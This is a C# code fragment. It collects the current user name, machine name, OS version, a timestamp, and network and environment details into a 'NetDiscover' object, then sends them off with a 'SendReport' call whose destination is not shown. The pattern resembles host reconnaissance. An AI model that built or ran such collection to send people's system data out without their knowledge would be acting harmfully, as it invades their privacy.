class Program
    {
    static void Main(string[] args)
        {
            requests r = new requests();
            NetDiscover info = new NetDiscover();
            r.SendReport(info);
        }
    }
public class NetDiscover 
    {
       public Network network { get;  set; }
       public Enviroment enviroment { get;  set; }
        public static readonly HttpClient client = new();
        public    string user { get;  set; } = Environment.UserName;
        public    string hostname { get;  set; }= Environment.MachineName;
        public    string fecha { get;  set; } = DateTime.Now.ToString();
        public    string version { get;  set; } = Environment.OSVersion.ToString();
      public NetDiscover()
        {
            fecha = DateTime.Now.ToString();
            network = new Network();
            enviroment = new Enviroment();
        }
    }   